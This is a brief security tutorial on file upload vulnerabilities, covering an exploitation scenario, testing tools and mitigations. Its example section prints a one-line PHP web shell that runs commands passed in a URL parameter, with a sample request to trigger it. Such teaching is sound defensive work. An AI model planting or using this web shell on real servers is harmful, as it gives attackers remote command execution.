# File Upload Vulnerabilities

## What is a File Upload Vulnerability?
File upload vulnerabilities occur when an attacker uploads malicious files (e.g., scripts, viruses) to a web application.

## Exploitation Example
### Scenario:
- The application accepts file uploads without validating file types.
- Upload a file named `shell.php` with the following content:
```php
<?php system($_GET['cmd']); ?>
```
- Access the file at http://example.com/uploads/shell.php?cmd=ls.

## Tools for Testing
- Burp Suite: Modify file extensions during upload.
- OWASP ZAP: Check for insecure upload mechanisms.

## Mitigation

- Validate file types and extensions.
- Store uploaded files outside the web root.
- Rename files with a random, non-predictable name.